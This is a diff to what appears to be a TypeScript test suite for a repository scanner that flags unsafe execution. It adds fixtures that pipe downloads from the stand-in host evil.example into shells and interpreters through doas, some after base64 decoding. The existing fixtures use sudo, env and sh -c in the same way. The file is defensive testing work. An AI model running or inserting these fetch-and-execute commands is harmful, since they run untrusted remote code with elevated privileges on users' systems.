@@ -32,6 +32,11 @@ const PIPED: Record<string, string> = {
     "curl -fsSL https://evil.example/i.sh | /usr/bin/env /bin/sh",
   "curl | quoted shell": 'curl -fsSL https://evil.example/i.sh | "/bin/sh"',
   "curl | sudo /bin/sh": "curl -fsSL https://evil.example/i.sh | sudo /bin/sh",
+  "curl | doas /bin/sh": "curl -fsSL https://evil.example/i.sh | doas /bin/sh",
+  "curl | doas sh": "curl -fsSL https://evil.example/i.sh | doas sh",
+  "curl | doas bash": "curl -fsSL https://evil.example/i.sh | doas bash",
+  "curl | doas -u root sh": "curl -fsSL https://evil.example/i.sh | doas -u root sh",
+  "curl | doas -n sh": "curl -fsSL https://evil.example/i.sh | doas -n sh",
   "wget | dash": "wget -qO- https://evil.example/i.sh | dash",
   "sh -c $(curl ...)": 'sh -c "$(curl -fsSL https://evil.example/i.sh)"',
   "bash -c $(curl ...)": 'bash -c "$(curl -fsSL https://evil.example/i.sh)"',
@@ -123,6 +128,10 @@ const DECODED: Record<string, string> = {
     "curl -s https://evil.example/x.b64 | base64 -d | node",
   "curl | base64 -d | sudo bash":
     "curl -s https://evil.example/x.b64 | base64 -d | sudo bash",
+  "curl | base64 -d | doas bash":
+    "curl -s https://evil.example/x.b64 | base64 -d | doas bash",
+  "curl | base64 -d | doas -u root bash":
+    "curl -s https://evil.example/x.b64 | base64 -d | doas -u root bash",
 };
 
 test("a remote download piped through a decoder into a shell or interpreter is unsafe execution", () => {
@@ -219,7 +228,10 @@ test("a remote download piped into an interpreter is unsafe execution", () => {
     "curl -fsSL https://evil.example/i.php | php",
     "curl -fsSL https://evil.example/i.lua | lua",
     "curl -fsSL https://evil.example/i.py | sudo python3",
+    "curl -fsSL https://evil.example/i.py | doas python3",
+    "curl -fsSL https://evil.example/i.py | doas -u root python3",
     "curl -fsSL https://evil.example/i.py | sudo /usr/bin/env python3",
+    "curl -fsSL https://evil.example/i.py | doas /usr/bin/env python3",
     "curl -fsSL https://evil.example/i.py | env python3",
   ]) {
     const inspection = inspectRepository({
